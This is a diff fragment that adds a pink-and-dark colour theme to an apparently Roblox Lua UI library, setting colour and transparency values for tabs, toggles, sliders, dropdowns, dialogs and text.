+        AcrylicGradient = ColorSequence.new(Color3.fromRGB(20, 20, 20), Color3.fromRGB(20, 20, 20)),
+        AcrylicNoise = 0.185,
+        TitleBarLine = Color3.fromRGB(235, 120, 255),
+        Tab = Color3.fromRGB(235, 120, 255),
+        Element = Color3.fromRGB(235, 120, 255),
+        ElementBorder = Color3.fromRGB(225, 100, 255),
+        InElementBorder = Color3.fromRGB(235, 120, 255),
+        ElementTransparency = 0.7,
+        ToggleSlider = Color3.fromRGB(235, 120, 255),
+        ToggleToggled = Color3.fromRGB(200, 100, 255),
+        SliderRail = Color3.fromRGB(235, 120, 255),
+        DropdownFrame = Color3.fromRGB(25, 25, 25),
+        DropdownHolder = Color3.fromRGB(30, 30, 30),
+        DropdownBorder = Color3.fromRGB(235, 120, 255),
+        DropdownOption = Color3.fromRGB(235, 120, 255),
+        Keybind = Color3.fromRGB(235, 120, 255),
+        Input = Color3.fromRGB(235, 120, 255),
+        InputFocused = Color3.fromRGB(255, 140, 255),
+        InputIndicator = Color3.fromRGB(235, 120, 255),
+        Dialog = Color3.fromRGB(235, 120, 255),
+        DialogHolder = Color3.fromRGB(30, 30, 30),
+        DialogHolderLine = Color3.fromRGB(235, 120, 255),
+        DialogButton = Color3.fromRGB(235, 120, 255),
+        DialogButtonBorder = Color3.fromRGB(235, 120, 255),
+        DialogBorder = Color3.fromRGB(235, 120, 255),
+        DialogInput = Color3.fromRGB(235, 120, 255),
+        DialogInputLine = Color3.fromRGB(235, 120, 255),
+        Text = Color3.fromRGB(255, 255, 255),
+        SubText = Color3.fromRGB(150, 150, 150),
+        Hover = Color3.fromRGB(255, 160, 255),
+        HoverChange = 0.17
     }
 end
 }
